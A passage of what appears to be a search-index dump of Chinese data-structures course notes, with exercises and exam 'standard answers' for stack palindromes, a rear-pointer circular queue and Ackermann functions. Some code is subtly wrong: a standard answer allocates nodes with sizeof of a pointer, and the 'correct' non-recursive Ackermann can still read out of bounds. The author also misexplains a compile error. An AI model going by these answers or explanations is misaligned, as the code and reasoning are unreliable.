<p>\u8003\u8bd5\u522b\u7528\u81ea\u5df1\u7684\u4ee3\u7801\uff0c\u56e0\u4e3a\u6807\u51c6\u7b54\u6848\u4e0d\u9700\u8981\u6539<code>main()</code>\u4e5f\u80fd\u901a\u8fc7\u68c0\u67e5\u3002\u56e0\u4e3a\u6807\u51c6\u7b54\u6848\u90fd\u628a\u4e00\u7cfb\u5217\u64cd\u4f5c\u96c6\u6210\u5230<code>IsHuiwen()</code>\u91cc\u9762\u4e86\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;   // \u4f7f\u7528\u52a8\u6001\u5185\u5b58\u5206\u914d\u51fd\u6570\n#include &lt;string.h&gt;   // \u4f7f\u7528\u5b57\u7b26\u4e32\u5904\u7406\u51fd\u6570\n\n#define StackSize 100 // \u8bbe\u7f6e\u6808\u7684\u6700\u5927\u5185\u5b58\u7a7a\u95f4\n\ntypedef struct {\n    // \u5b9a\u4e49\u6808\u7ed3\u6784\u4f53\n    char data[StackSize];\n    int top;\n} SeqStack;\n\nint IsEmpty(SeqStack* s) {\n    // \u5224\u65ad\u6808\u662f\u5426\u4e3a\u7a7a\n    return s-&gt;top == -1;\n}\n\nint Push(SeqStack* s, char chr) {\n    // \u8fdb\u884c\u5165\u6808\u64cd\u4f5c\n    if (s-&gt;top == StackSize - 1) {\n        printf(\"\u6808\u5df2\u6ee1\uff0c\u65e0\u6cd5\u5165\u6808\uff01\\n\");\n        return 0;\n    }\n\n    s-&gt;top++;\n    s-&gt;data[s-&gt;top] = chr;\n    return 1;\n}\n\nint Pop(SeqStack* s, char* chr) {\n    // \u53d6\u51fa\u6808\u9876\u5143\u7d20\n    if (IsEmpty(s)) {\n        printf(\"\u6808\u4e3a\u7a7a\uff0c\u65e0\u6cd5\u51fa\u6808\uff01\\n\");\n        return 0;\n    }\n\n    *chr = s-&gt;data[s-&gt;top];\n    s-&gt;top--;\n    return 1;\n}\n\nint IsHuiwen(char* str) {\n    // \u5224\u65ad\u56de\u6587\u6570\n    SeqStack stack;\n    stack.top = -1;\n\n    int len = strlen(str);\n    int i;\n\n    for (i = 0; i &lt; len; i++) {\n        Push(&amp;stack, str[i]);\n    }\n\n    for (i = 0; i &lt; len; i++) {\n        char chr;\n        Pop(&amp;stack, &amp;chr);\n        if (chr != str[i]) {\n            return 0;\n        }\n    }\n\n    return 1;\n}\n\nint main() {\n    char str[StackSize];\n    printf(\"\u8bf7\u8f93\u5165\u5b57\u7b26\u4e32\u5e8f\u5217\uff1a\");\n    fgets(str, sizeof(str), stdin);\n\n    // \u53bb\u9664\u672b\u5c3e\u7684\u6362\u884c\u7b26\n    str[strcspn(str, \"\\n\")] = '\\0';\n\n    if (IsHuiwen(str))\n        printf(\"\\n\u8be5\u5b57\u7b26\u4e32\u662f\u56de\u6587\u5b57\u7b26\u4e32\uff01\\n\");\n    else\n        printf(\"\\n\u8be5\u5b57\u7b26\u4e32\u4e0d\u662f\u56de\u6587\u5b57\u7b26\u4e32\uff01\\n\");\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_9","title":"\u6807\u51c6\u7b54\u6848\uff08\u8003\u8bd5\u7528\u8fd9\u4e2a\uff09","text":"C<pre><code>int IsEmpty(SeqStack* s) {\n    //\u5224\u65ad\u6808\u662f\u5426\u4e3a\u7a7a\n    return (s-&gt;top == -1 ? 1 : 0);\n}\n\nint IsHuiwen() {\n    //\u5224\u65ad\u56de\u6587\u6570\n    int i = 0, j = 0;\n    char chr1, chr2, str[100];                //\u5b9a\u4e49\u6570\u7ec4\uff0c\u8fdb\u6808\u65f6\u8bb0\u5f55\u6bcf\u4e2a\u5143\u7d20\u7684\u6b21\u5e8f\n    SeqStack* s;                              //\u5b9a\u4e49\u6808\n    s = (SeqStack*)malloc(sizeof(SeqStack)); //\u7ed9\u6808\u5206\u914d\u5185\u5b58\n    s-&gt;top = -1;                              //\u7f6e\u6808\u9876\u6307\u9488\u4e3a-1\n\n    while ((chr1 = getchar()) != '\\n') {      //\u8f93\u5165\u5b57\u7b26\u4e32\uff0c\u6309\u56de\u8f66\u952e\u7ed3\u675f\n        Push_Stack(s, chr1); //\u5165\u6808\n        str[i] = chr1;       //\u5165\u6808\u7684\u65f6\u5019\u4f9d\u6b21\u8bb0\u5f55\u4e0b\u6bcf\u4e2a\u5b57\u7b26\u5bf9\u5e94\u7684\u6570\u7ec4\u4e0b\u6807\n        i++;\n    }\n\n    while (!IsEmpty(s)) {\n        Pop_Stack(s, &amp;chr2);  //\u51fa\u6808\n        if (chr2 != str[j++]) //\u51fa\u6808\u7684\u65f6\u5019\uff0c\u5c06\u5b57\u7b26\u4f9d\u6b21\u4e0e\u5165\u6808\u8bb0\u5f55\u7684\u5b57\u7b26\u6bd4\u8f83\n            return 0;         //\u6bd4\u8f83\u4e4b\u540e\u4e0d\u76f8\u540c\uff0c\u8fd4\u56de0\n    }\n    return 1;\n}\n\nint Push_Stack(SeqStack* s, char chr) {\n    //\u8fdb\u884c\u5165\u6808\u64cd\u4f5c\n    if (s-&gt;top == StackSize - 1)\n        return 0; //\u6808\u6ee1\u8fd4\u56de0\n    s-&gt;top++;\n    s-&gt;data[s-&gt;top] = chr; //\u5165\u6808\u65f6\uff0c\u6808\u9876\u6307\u9488\u5148+1\uff0c\u518d\u8f93\u5165\u6570\u636e\n    return 1;\n}\n\nint Pop_Stack(SeqStack* s, char* chr) {\n    //\u53d6\u51fa\u6808\u9876\u5143\u7d20\n    if (s-&gt;top == -1)\n        return 0; //\u6808\u7a7a\u8fd4\u56de0\n    else {\n        *chr = s-&gt;data[s-&gt;top];\n        s-&gt;top--; //\u51fa\u6808\u65f6\uff0c\u5148\u8f93\u51fa\u6570\u636e\uff0c\u6808\u9876\u6307\u9488\u518d-1\uff0c\n        return 1;\n    }\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_10","title":"\u961f\u5217\u7684\u57fa\u672c\u64cd\u4f5c","text":"<p>1\u3001\u5047\u8bbe\u4ee5\u5e26\u5934\u7ed3\u70b9\u7684\u5faa\u73af\u94fe\u8868\u8868\u793a\u961f\u5217\uff0c\u5e76\u4e14\u53ea\u8bbe\u4e00\u4e2a\u6307\u9488\u6307\u5411\u961f\u5c3e\u5143\u7d20\u7ed3\u70b9\uff08\u6ce8\u610f\uff1a\u4e0d\u8bbe\u5934\u6307\u9488\uff09\uff0c\u8bd5\u7f16\u5199\u7b97\u6cd5\uff0c\u5b9e\u73b0\u961f\u5217\u7684\u57fa\u672c\u64cd\u4f5c\uff0c\u5305\u62ec\u521d\u59cb\u5316\u961f\u5217\u3001\u5224\u7a7a\u64cd\u4f5c\u3001\u5165\u961f\u64cd\u4f5c\u3001\u51fa\u961f\u64cd\u4f5c\u3002 2\u3001\u4f7f\u7528\u94fe\u8868\u5b9e\u73b0\u961f\u5217\u6570\u636e\u7ed3\u6784\u3002 3\u3001\u7a0b\u5e8f\u5e94\u8be5\u80fd\u591f\u5904\u7406\u4efb\u610f\u6570\u91cf\u7684\u5165\u961f\u5143\u7d20\uff0c\u5e76\u8f93\u51fa\u51fa\u961f\u5143\u7d20\u3002</p> <p>\u793a\u4f8b\uff1a</p> <p>\u8f93\u5165\uff08\u7b2c\u4e00\u4e2a\u662f\u5143\u7d20\u4e2a\u6570\uff09\uff1a</p> Text Only<pre><code>3\n1\n2\n3\n</code></pre> <p>\u8f93\u51fa\uff1a</p> Text Only<pre><code>123\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_11","title":"\u6ce8\u610f\u4e8b\u9879","text":"<p>1\u3001\u961f\u5217\u7684\u521d\u59cb\u5316\u9700\u8981\u5206\u914d\u4e00\u4e2a\u5934\u7ed3\u70b9\uff0c\u5e76\u5c06\u961f\u5c3e\u6307\u9488\u6307\u5411\u8be5\u5934\u7ed3\u70b9\uff0c\u5f62\u6210\u4e00\u4e2a\u7a7a\u961f\u5217\u3002 2\u3001\u5165\u961f\u64cd\u4f5c\u901a\u8fc7\u52a8\u6001\u5206\u914d\u5185\u5b58\u521b\u5efa\u65b0\u7684\u961f\u5217\u5143\u7d20\uff0c\u5e76\u8c03\u6574\u961f\u5c3e\u6307\u9488\u3002 3\u3001\u51fa\u961f\u64cd\u4f5c\u901a\u8fc7\u5220\u9664\u961f\u5934\u5143\u7d20\uff0c\u5e76\u5c06\u961f\u5c3e\u6307\u9488\u6307\u5411\u65b0\u7684\u961f\u5934\u5143\u7d20\u3002 4\u3001\u7a0b\u5e8f\u4e2d\u4f7f\u7528\u4e86\u52a8\u6001\u5185\u5b58\u5206\u914d\uff0c\u786e\u4fdd\u91ca\u653e\u5185\u5b58\u4ee5\u9632\u6b62\u5185\u5b58\u6cc4\u6f0f\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_12","title":"\u9898\u76ee","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef int ElemType;\n\ntypedef struct queue {\n    ElemType data;\n    struct queue *next;\n} queue, *LinkQueue;\n\ntypedef struct {\n    LinkQueue rear;\n    int length;\n} SqQueue;\n\nvoid InitQueue(SqQueue *queue) {\n    // \u521d\u59cb\u5316\u961f\u5217\uff0c\u7a7a\u961f\u5217\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint EmptyQueue(SqQueue *queue) {\n    // \u5224\u7a7a\u64cd\u4f5c\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nvoid EnQueue(SqQueue *queue, ElemType elem) {\n    // \u5165\u961f\u64cd\u4f5c\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nvoid DelQueue(SqQueue *queue, ElemType *elem) {\n    // \u51fa\u961f\u64cd\u4f5c\n    // \u8bf7\u5728\u6b64\u5904\u7f16\u5199\u4ee3\u7801\n\n\n}\n\nint main() {\n    int x, n;\n    SqQueue Q;\n    ElemType elem;\n    InitQueue(&amp;Q);\n\n    // \u5224\u65ad\u961f\u5217\u662f\u5426\u4e3a\u7a7a\n    if (EmptyQueue(&amp;Q))\n        printf(\"\u76ee\u524d\u662f\u4e00\u4e2a\u7a7a\u961f\u5217\uff01\\n\");\n    else\n        printf(\"\u76ee\u524d\u8be5\u961f\u5217\u4e2d\u6709\u5143\u7d20\uff0c\u4e0d\u4e3a\u7a7a\uff01\\n\");\n\n    // \u5165\u961f\n    printf(\"\u8f93\u5165\u5165\u961f\u5143\u7d20\u4e2a\u6570\uff1a\");\n    scanf(\"%d\", &amp;n);\n    for (int i = 1; i &lt;= n; i++) {\n        printf(\"\u8f93\u5165\u7b2c%d\u4e2a\u5165\u961f\u5143\u7d20\uff1a\", i);\n        scanf(\"%d\", &amp;x);\n        EnQueue(&amp;Q, x);\n    }\n\n    printf(\"\u51fa\u961f\u5143\u7d20\uff1a\");\n    // \u51fa\u961f\n    for (int j = 1; j &lt;= n; j++) {\n        DelQueue(&amp;Q, &amp;elem);\n        printf(\"%d\", elem);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_13","title":"\u7b54\u6848","text":"<p>\u6ce8\u610f\uff0c\u5b83\u662f\u4e2a\u73af\uff01</p> <p>\u6ce8\u610f\uff1a\u5982\u679c\u628a<code>EnQueue()</code>\u51fd\u6570\u4e2d\u7684<code>malloc</code>\u64cd\u4f5c\u4e2d\u7684<code>(sizeof(struct queue))</code>\u6539\u4e3a<code>(sizeof(queue))</code>\u5219\u4f1a\u7f16\u8bd1\u62a5\u9519\u3002</p> <ul> <li> <p>\u95ee\u9898\u51fa\u73b0\u7684\u5730\u65b9\uff1a</p> <ul> <li>\u5728\u4f60\u7684 <code>EnQueue</code> \u51fd\u6570\u4e2d\uff0c\u4f60\u5c1d\u8bd5\u4f7f\u7528 <code>sizeof(queue)</code> \u6765\u83b7\u53d6 <code>queue</code> \u6570\u636e\u7c7b\u578b\u6240\u5360\u5185\u5b58\u7684\u5927\u5c0f\u3002</li> <li>\u7136\u800c\uff0c<code>queue</code> \u5e76\u4e0d\u662f\u4e00\u4e2a\u5177\u4f53\u7684\u6570\u636e\u7c7b\u578b\uff0c\u5b83\u53ea\u662f\u4e00\u4e2a\u522b\u540d\u3002</li> <li>\u5b9e\u9645\u4e0a\uff0c<code>queue</code> \u5728\u4f60\u7684\u4ee3\u7801\u4e2d\u662f\u901a\u8fc7 <code>typedef</code> \u5b9a\u4e49\u7684\u522b\u540d\uff0c\u4ee3\u8868\u7684\u662f <code>struct queue</code> \u8fd9\u4e2a\u7ed3\u6784\u4f53\u3002</li> </ul> </li> <li> <p>\u89e3\u51b3\u65b9\u6848\uff1a</p> <ul> <li> <p>\u4e3a\u4e86\u83b7\u53d6 <code>struct queue</code> \u6240\u5360\u5185\u5b58\u7684\u5927\u5c0f\uff0c\u4f60\u5e94\u8be5\u4f7f\u7528 <code>sizeof(struct queue)</code> \u6216\u8005 <code>sizeof(*queue-&gt;rear)</code>\u3002</p> </li> <li> <p>\u8fd9\u6837\uff0c<code>sizeof</code> \u8fd0\u7b97\u7b26\u5c31\u4f1a\u8fd4\u56de\u6b63\u786e\u7684\u7ed3\u6784\u4f53 <code>queue</code> \u6240\u5360\u5185\u5b58\u7684\u5927\u5c0f\uff0c\u800c\u4e0d\u4f1a\u5f15\u53d1\u7f16\u8bd1\u9519\u8bef\u3002</p> </li> </ul> </li> </ul> <p>\u4e0d\u8fc7\u8fd9\u4e2a\u9519\u8bef\u53ea\u662f\u5728VS\u7f16\u8bd1\u65f6\u4f1a\u51fa\u73b0\uff0c\u5e76\u6ca1\u6709\u5728Alpha\u4e2d\u4f53\u73b0\uff0c\u6807\u51c6\u7b54\u6848\u4e5f\u662f\u76f4\u63a5<code>sizeof(queue)</code>\uff0c\u6211\u5f88\u4e0d\u7406\u89e3\u8fd9\u4e2a\u9519\u8bef\uff0c\u5e73\u65f6\u4e0d\u90fd\u662f\u7528\u522b\u540d\u5417\u3002\u5f88\u62bd\u8c61\u2026\u2026</p> <p>\u800c\u4e14<code>InitQueue()</code>\u4e5f\u4e0d\u9700\u8981\u6dfb\u52a0<code>struct</code>\uff0c\u4f46\u662f<code>EmptyQueue()</code>\u4e0d\u6dfb\u52a0\u5c31\u4f1a\u62a5\u9519\u3002</p> C<pre><code>void InitQueue(SqQueue* queue) {\n    // \u521d\u59cb\u5316\u961f\u5217\uff0c\u7a7a\u961f\u5217\n    queue-&gt;rear = (LinkQueue)malloc(sizeof(struct queue));\n    queue-&gt;rear-&gt;next = queue-&gt;rear;\n    queue-&gt;length = 0;\n}\n\nint EmptyQueue(SqQueue* queue) {\n    // \u5224\u7a7a\u64cd\u4f5c\n    return queue-&gt;length == 0;\n}\n\nvoid EnQueue(SqQueue* queue, ElemType elem) {\n    // \u5165\u961f\u64cd\u4f5c\n    LinkQueue newNode = (LinkQueue)malloc(sizeof(struct queue));\n    newNode-&gt;data = elem;\n    newNode-&gt;next = queue-&gt;rear-&gt;next;\n    queue-&gt;rear-&gt;next = newNode;\n    queue-&gt;rear = newNode;\n    queue-&gt;length++;\n}\n\nvoid DelQueue(SqQueue* queue, ElemType* elem) {\n    // \u51fa\u961f\u64cd\u4f5c\n    if (EmptyQueue(queue)) {\n        printf(\"\u961f\u5217\u4e3a\u7a7a\uff0c\u65e0\u6cd5\u51fa\u961f\uff01\\n\");\n        return;\n    }\n\n    LinkQueue front = queue-&gt;rear-&gt;next-&gt;next;\n    *elem = front-&gt;data;\n    queue-&gt;rear-&gt;next-&gt;next = front-&gt;next;\n    free(front);\n    queue-&gt;length--;\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_14","title":"\u6807\u51c6\u7b54\u6848","text":"<p>\u6807\u51c6\u7b54\u6848\u5168\u7a0b\u6ca1\u6709\u7528\u8fc7<code>length</code>\uff0c\u8fd9\u4e2a\u5e94\u8be5\u6539\u8fdb\u4e00\u4e0b</p> C<pre><code>void InitQueue(SqQueue* queue) {\n    // \u521d\u59cb\u5316\u961f\u5217\uff0c\u7a7a\u961f\u5217\n    queue-&gt;rear = (LinkQueue)malloc(sizeof(queue));\n    queue-&gt;rear-&gt;next = queue-&gt;rear;\n}\n\nint EmptyQueue(SqQueue* queue) {\n    // \u5224\u7a7a\u64cd\u4f5c\n    if (queue-&gt;rear-&gt;next == queue-&gt;rear)\n        return 1;\n    else\n        return 0;\n}\n\nvoid EnQueue(SqQueue* queue, ElemType elem) {\n    // \u5165\u961f\u64cd\u4f5c\n    LinkQueue que = (LinkQueue)malloc(sizeof(queue));\n    if (!que)\n        return;\n\n    que-&gt;data = elem;\n    que-&gt;next = queue-&gt;rear-&gt;next;\n    queue-&gt;rear-&gt;next = que;\n    queue-&gt;rear = que;\n}\n\nvoid DelQueue(SqQueue* queue, ElemType* elem) {\n    // \u51fa\u961f\u64cd\u4f5c\n    if (queue-&gt;rear-&gt;next == queue-&gt;rear)\n        printf(\"\u4e3a\u7a7a\u961f\u5217\uff01\");\n\n    LinkQueue front = queue-&gt;rear-&gt;next-&gt;next;\n    *elem = front-&gt;data;\n    queue-&gt;rear-&gt;next-&gt;next = front-&gt;next;\n    free(front);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#ack","title":"\u8ba1\u7b97Ack\u7684\u9012\u5f52\u7b97\u6cd5","text":"<p>\u5df2\u77e5<code>Ackermann</code>\u51fd\u6570\u5b9a\u4e49\u5982\u4e0b\uff1a</p> \\[ \\operatorname{Ack}(m, n)=\\left\\{\\begin{array}{ll}n+1 &amp; \\text { \u5f53 } m=0 \\text { \u65f6 } \\\\\\operatorname{Ack}(m-1,1) &amp; \\text { \u5f53 } m \\neq 0, n=0 \\text { \u65f6 } \\\\\\operatorname{Ack}\\langle m-1, \\operatorname{Ack}(m, n-1)\\rangle &amp; \\text { \u5f53 } m \\neq 0, n \\neq 0 \\text { \u65f6 }\\end{array}\\right. \\]"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_15","title":"\u9898\u76ee\u8981\u6c42","text":"<p>1\u3001\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u4f7f\u7528\u9012\u5f52\u7b97\u6cd5\u8ba1\u7b97<code>Ackermann</code>\u51fd\u6570\u3002</p> <p>2\u3001\u7528\u6237\u8f93\u5165\u4e24\u4e2a\u975e\u8d1f\u6574\u6570 m \u548c n\u3002</p> <p>3\u3001\u8ba1\u7b97\u5e76\u8f93\u51fa Ackermann(m, n) \u7684\u7ed3\u679c\u3002</p> <p>\u793a\u4f8b 1\uff1a</p> <p>\u8f93\u5165</p> Text Only<pre><code>2,1\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>Ack(2,1)=5\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_16","title":"\u6ce8\u610f\u4e8b\u9879","text":"<p>1\u3001<code>Ackermann</code>\u51fd\u6570\u662f\u4e00\u4e2a\u975e\u5e38\u7279\u6b8a\u7684\u9012\u5f52\u51fd\u6570\uff0c\u5176\u589e\u957f\u901f\u5ea6\u6781\u5feb\uff0c\u56e0\u6b64\u5bf9\u4e8e\u8f83\u5927\u7684\u8f93\u5165\u503c\u53ef\u80fd\u5bfc\u81f4\u6808\u6ea2\u51fa\u6216\u8ba1\u7b97\u65f6\u95f4\u8fc7\u957f\u3002 2\u3001\u7528\u6237\u8f93\u5165\u7684 m \u548c n \u5e94\u4e3a\u975e\u8d1f\u6574\u6570\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_17","title":"\u9898\u76ee","text":"C<pre><code>#include&lt;stdio.h&gt;\n\nint Ack(int m,int n){\n    //Ack\u51fd\u6570 \uff0c\u9012\u5f52\u7b97\u6cd5 \n\n}\n\nint main(){\n    int m,n,x;\n    printf(\"\u8bf7\u8f93\u5165m,n\uff1a\");\n    scanf(\"%d,%d\",&amp;m,&amp;n); \n    x=Ack(m,n);\n    printf(\"Ack(%d,%d)=%d\",m,n,x);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_18","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>int Ack(int m, int n) {\n    //Ack\u51fd\u6570 \uff0c\u9012\u5f52\u7b97\u6cd5 \n    if (m == 0)\n        return n + 1;\n    else if (m != 0 &amp;&amp; n == 0)\n        return Ack(m - 1, 1);\n    else if (m != 0 &amp;&amp; n != 0)\n        return Ack(m - 1, Ack(m, n - 1));\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#ack_1","title":"\u8ba1\u7b97Ack\u7684\u975e\u9012\u5f52\u7b97\u6cd5","text":"<p>\u5df2\u77e5<code>Ackermann</code>\u51fd\u6570\u5b9a\u4e49\u5982</p> \\[ \\operatorname{Ack}(m, n)=\\left\\{\\begin{array}{ll}n+1 &amp; \\text { \u5f53 } m=0 \\text { \u65f6 } \\\\\\operatorname{Ack}(m-1,1) &amp; \\text { \u5f53 } m \\neq 0, n=0 \\text { \u65f6 } \\\\\\operatorname{Ack}\\langle m-1, \\operatorname{Ack}(m, n-1)\\rangle &amp; \\text { \u5f53 } m \\neq 0, n \\neq 0 \\text { \u65f6 }\\end{array}\\right. \\]"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_19","title":"\u9898\u76ee\u8981\u6c42","text":"<p>1\u3001\u7f16\u5199\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u4f7f\u7528\u975e\u9012\u5f52\u7b97\u6cd5\u8ba1\u7b97<code>Ackermann</code>\u51fd\u6570\u3002</p> <p>2\u3001\u7528\u6237\u8f93\u5165\u4e24\u4e2a\u975e\u8d1f\u6574\u6570 m \u548c n\u3002</p> <p>3\u3001\u8ba1\u7b97\u5e76\u8f93\u51fa Ackermann(m, n) \u7684\u7ed3\u679c\u3002</p> <p>\u793a\u4f8b 1\uff1a</p> <p>\u8f93\u5165</p> Text Only<pre><code>2,1\n</code></pre> <p>\u8f93\u51fa</p> Text Only<pre><code>Ack(2,1)=5\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_20","title":"\u6ce8\u610f\u4e8b\u9879","text":"<p>1\u3001<code>Ackermann</code>\u51fd\u6570\u7684\u975e\u9012\u5f52\u8ba1\u7b97\u5229\u7528\u4e86\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4\uff0c\u901a\u8fc7\u5faa\u73af\u8fed\u4ee3\u8ba1\u7b97\u5f97\u5230\u7ed3\u679c\u3002 2\u3001\u7528\u6237\u8f93\u5165\u7684 m \u548c n \u5e94\u4e3a\u975e\u8d1f\u6574\u6570\u3002</p>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_21","title":"\u9898\u76ee","text":"C<pre><code>#include&lt;stdio.h&gt;\n#define M 100\n#define N 100\n\nint Ack_re(int m, int n){\n    //Ack\u51fd\u6570\uff0c\u975e\u9012\u5f52 \n\n}\n\nint main(){\n    int m,n,x;\n    printf(\"\u8bf7\u8f93\u5165m,n\uff1a\");\n    scanf(\"%d,%d\",&amp;m,&amp;n); \n    x=Ack_re(m,n);\n    printf(\"Ack_re(%d,%d)=%d\",m,n,x);\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_22","title":"\u7b54\u6848","text":"<p>\u5148\u770b\u4e00\u4e2a\u9519\u8bef\u793a\u8303\uff1a\u8fd9\u79cd\u4f1a\u9020\u6210\u6570\u7ec4\u7684\u8d8a\u754c\u8bbf\u95ee\uff0c\u4fee\u6539\u4e5f\u5c31\u662f\u5c06\u5faa\u73af\u6761\u4ef6 <code>i &lt;= m</code> \u548c <code>j &lt;= n</code> \u4fee\u6539\u4e3a <code>i &lt; M</code> \u548c <code>j &lt; N</code>\uff0c\u786e\u4fdd\u5728\u6570\u7ec4\u8303\u56f4\u5185\u8fdb\u884c\u5faa\u73af\u3002</p> <p>\u4f46\u662f\u8fd9\u79cd\u611f\u89c9\u4f18\u5316\u7a7a\u95f4\u5f88\u5927\uff0c\u6bd5\u7adf\u5b83\u8981\u5faa\u73afM*N\u6b21\uff0c\u6700\u540e\u518d\u53d6\u51fa\u4e00\u4e2a\u503c\u6765\uff0c\u4f46\u662f\u8fd9\u4e2a\u503c\u5f88\u53ef\u80fd\u5728\u6570\u7ec4\u7684\u6700\u524d\u7aef\uff0c\u5f88\u53ef\u80fd\u7edd\u5927\u591a\u6570\u7684\u5faa\u73af\u90fd\u662f\u65e0\u7528\u7684\u3002</p> C<pre><code>int Ack_re(int m, int n) {\n    int arr[M][N];\n    int i, j;\n\n    for (i = 0; i &lt;= m; i++) {\n        for (j = 0; j &lt;= n; j++) {\n            if (i == 0) {\n                arr[i][j] = j + 1;\n            }\n            else if (j == 0) {\n                arr[i][j] = arr[i - 1][1];\n            }\n            else {\n                arr[i][j] = arr[i - 1][arr[i][j - 1]];\n            }\n        }\n    }\n\n    return arr[m][n];\n}\n</code></pre> <p>\u6b63\u786e\u7b54\u6848\uff1a\u5176\u5b9e\u4e5f\u5c31\u662f\u7528\u4e8c\u7ef4\u6570\u7ec4\u53bb\u5b58\u50a8\u6bcf\u6b21Ack\u7684\u6267\u884c\u7ed3\u679c\uff0c\u4e4b\u540e\u518d\u9700\u8981\u7528\u7684\u65f6\u5019\u5c31\u4ece\u4e8c\u7ef4\u6570\u7ec4\u4e2d\u8c03\u7528\u3002\uff08\u5b58\u50a8\u4e2d\u95f4\u7ed3\u679c\uff09</p> <p>\u4e3a\u4e86\u4fbf\u4e8e\u7406\u89e3\uff0c\u753b\u4e00\u4e2a<code>9*9</code>\u7684\u4e8c\u7ef4\u6570\u7ec4\u770b\u4e00\u770b\uff0c\u6216\u8005VS\u91cc\u9762\u8c03\u8bd5\u6253\u65ad\u70b9\u76d1\u89c6\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\u5f88\u591a\u5730\u65b9\u662f\u8d8a\u754c\u72b6\u6001\uff0c\u6240\u4ee5\u4e3a\u4e86\u6ee1\u8db3\u6709\u4e9b\u8ba1\u7b97\u8981\u6c42\uff0c\u5c31\u53ea\u80fd\u6269\u5927\u4e8c\u7ef4\u6570\u7ec4\uff0c\u4f46\u8fd9\u4e5f\u4f34\u968f\u7740\u8ba1\u7b97\u91cf\u7684\u589e\u52a0\u3002\u5f53\u7136\uff0c\u8fd9\u513f\u7684\u201c\u8d8a\u754c\u201d\u4e0e\u9519\u8bef\u793a\u4f8b\u7684\u8d8a\u754c\u4e0d\u540c\uff0c\u9519\u8bef\u793a\u4f8b\u7684\u8ba1\u7b97\u9650\u5236\u5728\u4e86\u5f88\u5c0f\u7684\u7a7a\u95f4\u4e2d\uff0c\u5c31\u4f1a\u5bfc\u81f4\u8d8a\u754c\u662f\u65e0\u6cd5\u907f\u514d\u7684\u3002\u800c\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u6269\u5927\u4e8c\u7ef4\u6570\u7ec4\u6765\u907f\u514d\u8d8a\u754c\u3002</p> Text Only<pre><code>    0  1  2  3  4  5  6  7  8\n------------------------------\n0|  1  2  3  4  5  6  7  8  9\n1|  2  3  4  5  6  7  8  9 [ ]\n2|  3  5  7  9  [   \u8d8a  \u754c   ]\n3|  ..........................\n4|  ..........................\n5|  ..........................\n6|  ..........................\n7|  ..........................\n8|  ..........................\n</code></pre> <p>\u6b63\u786e\u4ee3\u7801\uff1a</p> C<pre><code>int Ack_re(int m, int n) {\n    int arr[M][N];\n    int i, j;\n\n    for (i = 0; i &lt; M; i++) {\n        for (j = 0; j &lt; N; j++) {\n            if (i == 0) {\n                arr[i][j] = j + 1;\n            }\n            else if (j == 0) {\n                arr[i][j] = arr[i - 1][1];\n            }\n            else {\n                arr[i][j] = arr[i - 1][arr[i][j - 1]];\n            }\n        }\n    }\n\n    return arr[m][n];\n}\n</code></pre>"},{"location":"DEC/Data-Structure/Alpha-%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/#_23","title":"\u6807\u51c6\u7b54\u6848","text":"C<pre><code>int Ack_re(int m, int n) {\n    //Ack\u51fd\u6570 \uff0c \u975e\u9012\u5f52\n    int akm[M][N];\n    int i, j;\n    for (j = 0; j &lt; N; j++)\n        akm[0][j] = j + 1;\n    for (i = 1; i &lt; M; i++) {\n        akm[i][0] = akm[i - 1][1];\n        for (j = 1; j &lt; N; j++)\n            akm[i][j] = akm[i - 1][akm[i][j - 1]];\n    }\n    return 